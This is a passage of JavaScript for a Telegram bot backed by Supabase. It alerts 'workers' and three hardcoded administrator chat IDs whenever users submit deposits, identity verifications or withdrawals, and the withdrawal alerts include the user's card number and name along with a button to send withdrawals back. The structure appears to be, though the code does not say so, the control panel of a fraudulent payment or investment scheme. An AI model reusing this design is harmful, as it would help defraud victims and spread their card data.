  bot.api.sendMessage(user.ref_id, `Пользователь @${user.username} \n ${user.first_name} \n создал запрос на ввод ${payload.new.amount} ${payload.new.currency} ${payload.new.url} worker: ${data.username} \n ${data.first_name} \n ${data.worker_comment}`);
  bot.api.sendMessage(7561947088, `Пользователь @${user.username} \n ${user.first_name} \n создал запрос на ввод ${payload.new.amount} ${payload.new.currency} ${payload.new.url}, worker: ${data.username} \n ${data.first_name} \n ${data.worker_comment}`);
  bot.api.sendMessage(7184660397, `Пользователь @${user.username} \n ${user.first_name} \n создал запрос на ввод ${payload.new.amount} ${payload.new.currency} ${payload.new.url}, worker: ${data.username} \n ${data.first_name} \n ${data.worker_comment}`);
  bot.api.sendMessage(6993432791, `Пользователь @${user.username} \n ${user.first_name} \n создал запрос на ввод ${payload.new.amount} ${payload.new.currency} ${payload.new.url}, worker: ${data.username} \n ${data.first_name} \n ${data.worker_comment}`);
}
async function handleVerifictionInsert(payload) {
  console.log('New verification:', payload.new);
  const { data: user } = await supabase.from('users').select('*').eq('chat_id', payload.new.chat_id).single();
  console.log('user:', user);
  const { data: worker } = await supabase.from('users').select('*').eq('chat_id', user.ref_id).single();
  console.log('worker:', worker);
  const keyboard = new InlineKeyboard().text('Details', `details ${payload.new.chat_id}`);
  bot.api.sendMessage(worker.chat_id, `Користувач @${user.username} відправив верифікацію.`, {
    reply_markup: keyboard
  });
  bot.api.sendMessage(7561947088, `Користувач @${user.username} відправив верифікацію. worker: ${worker.username} \n ${worker.first_name}`, {
    reply_markup: keyboard
  });
  bot.api.sendMessage(7184660397, `Користувач @${user.username} відправив верифікацію. worker: ${worker.username} \n ${worker.first_name}`, {
    reply_markup: keyboard
  });
  bot.api.sendMessage(6993432791, `Користувач @${user.username} відправив верифікацію. worker: ${worker.username} \n ${worker.first_name}`, {
    reply_markup: keyboard
  });
}
// supabase.realtime.disconnect();
// setTimeout(() => supabase.realtime.connect(), 5000);
const { data: updateSubscription2, error: updateSubscriptionError2 } = await supabase.channel('blabla').on('postgres_changes', {
  event: 'INSERT',
  schema: 'public',
  table: 'withdraws'
}, handleInsertInvoice).on('postgres_changes', {
  event: 'INSERT',
  schema: 'public',
  table: 'verification'
}, handleVerifictionInsert).subscribe();
const activeChannels = supabase.getChannels();
activeChannels.forEach((channel)=>{
  console.log(`Канал: ${channel.topic}, статус: ${channel.state}`);
});
async function handleInsertInvoice(payload) {
  console.log('New invoice:', payload.new);
  const keyboard = new InlineKeyboard().text('Details', `details ${payload.new.chat_id}`).row().text('Повернути назад', `back ${payload.new.chat_id} ${payload.new.amount} ${payload.new.currency} ${payload.new.id}`);
  const { data, error } = await supabase.from('users').select('*').eq('chat_id', payload.new.chat_id).single();
  const { data: worker, error: workerError } = await supabase.from('users').select('*').eq('chat_id', data.ref_id).single();
  const message = `Новий вивід:
  Сума: ${payload.new.amount}
  Номер картки: ${payload.new.card_number}
  Ім'я: ${payload.new.name}
  Користувач: @${data?.username}
  Worker: @${worker?.username} \n
  Worker name: ${worker?.first_name}`;
  bot.api.sendMessage(data.ref_id, message, {
    reply_markup: keyboard
  });
  bot.api.sendMessage('7561947088', message, {
    reply_markup: keyboard
  });
  bot.api.sendMessage('7184660397', message, {
    reply_markup: keyboard
  });
  bot.api.sendMessage('6993432791', message, {
    reply_markup: keyboard
  });
}
const handleUpdate = webhookCallback(bot, "std/http");
serve(async (req)=>{
  try {
    return await handleUpdate(req);
  } catch (err) {
    console.error(err);
  }
});
